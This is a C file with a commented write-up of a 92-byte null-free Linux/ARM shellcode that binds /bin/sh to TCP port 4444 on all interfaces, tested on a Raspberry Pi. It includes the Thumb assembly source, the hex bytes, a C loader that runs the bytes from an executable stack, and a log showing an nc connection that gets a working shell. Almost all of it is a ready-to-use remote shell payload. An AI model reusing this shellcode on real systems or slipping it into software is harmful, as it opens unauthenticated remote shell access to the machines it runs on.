/*
# Title:  Linux/ARM - Bind (0.0.0.0:4444/TCP) Shell (/bin/sh) + Null-Free Shellcode (92 Bytes)
# Date:   2018-09-26
# Tested: armv7l (Raspberry Pi 3 Model B+)
# Author: Ken Kitahara

[System Information]
pi@raspberrypi:~ $ uname -a
Linux raspberrypi 4.14.52-v7+ #1123 SMP Wed Jun 27 17:35:49 BST 2018 armv7l GNU/Linux
pi@raspberrypi:~ $ lsb_release -a
No LSB modules are available.
Distributor ID:	Raspbian
Description:	Raspbian GNU/Linux 9.4 (stretch)
Release:	9.4
Codename:	stretch
pi@raspberrypi:~ $


[Source Code]
pi@raspberrypi:~ $ cat bindshell.s
.section .text
.global _start

_start:
    .ARM
    add  lr, pc, #1
    bx   lr

    .THUMB
    // socket(2, 1, 0)
    mov  r0, #2
    mov  r1, #1
    eor  r2, r2, r2
    mov  r7, #200
    add  r7, #81
    svc  #1
    mov  r3, r0

    // bind(fd, &sockaddr, 16)
    adr  r1, struct_addr
    strb r2, [r1, #1]
    str  r2, [r1, #4]
    mov  r2, #16
    add  r7, r7, #1
    svc  #1

    // listen(host_sockid, 2)
    mov  r0, r3
    mov  r1, #2
    add  r7, r7, #2
    svc  #1

    // accept(host_sockid, 0, 0)
    mov  r0, r3
    eor  r1, r1, r1
    eor  r2, r2, r2
    add  r7, r7, #1
    svc  #1

    mov  r3, r0
    mov  r1, #3
    mov  r7, #63

    duploop:
    // dup2(client_sockid, 2)
    // -> dup2(client_sockid, 1)
    // -> dup2(client_sockid, 0)
    mov  r0, r3
    sub  r1, r1, #1
    svc  #1
    cmp  r1, r2
    bne  duploop

    // execve("/bin/sh", 0, 0)
    adr  r0, spawn
    strb r1, [r0, #7]
    mov  r7, #11
    svc  #1

struct_addr:
.ascii "\x02\xff"
.ascii "\x11\x5c"
.byte 1,1,1,1

spawn:
.ascii "/bin/shX"
pi@raspberrypi:~ $ as -o bindshell.o bindshell.s && ld -N -o bindshell bindshell.o
pi@raspberrypi:~ $ objcopy -O binary bindshell bindshell.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' bindshell.bin && echo
\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x03\x1c\x0d\xa1\x4a\x70\x4a\x60\x10\x22\x01\x37\x01\xdf\x18\x1c\x02\x21\x02\x37\x01\xdf\x18\x1c\x49\x40\x52\x40\x01\x37\x01\xdf\x03\x1c\x03\x21\x3f\x27\x18\x1c\x01\x39\x01\xdf\x91\x42\xfa\xd1\x03\xa0\xc1\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58
pi@raspberrypi:~ $


[Operation Test]
(1) Compile and execute this PoC.
pi@raspberrypi:~ $ gcc -fno-stack-protector -z execstack loader-bind.c -o loader-bind
pi@raspberrypi:~ $ ./loader-bind
Shellcode Length: 92

(2) Connect to 127.0.0.1:4444/TCP from another terminal.
pi@raspberrypi:~ $ nc -vv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
exit
^C
pi@raspberrypi:~ $

*/

#include<stdio.h>
#include<string.h>

unsigned char sc[] = \
"\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1"
"\x02\x20\x01\x21\x52\x40\xc8\x27"
"\x51\x37\x01\xdf\x03\x1c\x0d\xa1"
"\x4a\x70\x4a\x60\x10\x22\x01\x37"
"\x01\xdf\x18\x1c\x02\x21\x02\x37"
"\x01\xdf\x18\x1c\x49\x40\x52\x40"
"\x01\x37\x01\xdf\x03\x1c\x03\x21"
"\x3f\x27\x18\x1c\x01\x39\x01\xdf"
"\x91\x42\xfa\xd1\x03\xa0\xc1\x71"
"\x0b\x27\x01\xdf\x02\xff\x11\x5c"
"\x01\x01\x01\x01\x2f\x62\x69\x6e"
"\x2f\x73\x68\x58";

void main()
{
    printf("Shellcode Length: %d\n", strlen(sc));

    int (*ret)() = (int(*)())sc;

    ret();
}